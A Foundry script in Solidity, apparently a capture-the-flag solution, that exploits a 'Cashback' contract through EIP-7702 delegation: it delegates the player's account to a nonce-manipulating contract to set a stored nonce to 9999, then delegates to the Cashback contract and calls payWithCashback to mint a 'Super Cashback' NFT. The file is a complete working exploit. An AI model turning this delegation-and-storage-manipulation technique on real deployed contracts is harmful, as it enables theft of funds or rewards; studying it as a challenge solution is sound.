// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Script, console} from "@forge-std/Script.sol";
import {Cashback, Currency, CurrencyLibrary} from "../src/Cashback.sol";
import {NonceManipulator} from "../src/Solve.sol";

contract Exploit is Script {
    using CurrencyLibrary for Currency;

    function run() external {
        uint256 playerPk = vm.envUint("USER_PRIVATE_KEY");
        address player = vm.addr(playerPk);
        address cashbackAddr = 0x35dBaC39cd2a7282f9E9D18Db598762a81e87913;
        
        console.log("Player:", player);
        console.log("Cashback:", cashbackAddr);

        // ========== Step 1: NonceManipulator 배포 ==========
        vm.broadcast(playerPk);
        NonceManipulator manipulator = new NonceManipulator();
        console.log("NonceManipulator deployed:", address(manipulator));

        // ========== Step 2: Delegate to Manipulator + setNonce() ==========
        vm.signAndAttachDelegation(address(manipulator), playerPk);
        vm.broadcast(playerPk);
        NonceManipulator(player).setNonce();
        console.log("Nonce set to 9999");

        // ========== Step 3: Delegate to Cashback + payWithCashback() ==========
        vm.signAndAttachDelegation(cashbackAddr, playerPk);
        vm.broadcast(playerPk);
        Cashback(payable(player)).payWithCashback(
            CurrencyLibrary.NATIVE_CURRENCY,
            player,
            0
        );
        
        console.log("Super Cashback NFT minted!");
        console.log("Exploit Complete!");
    }
}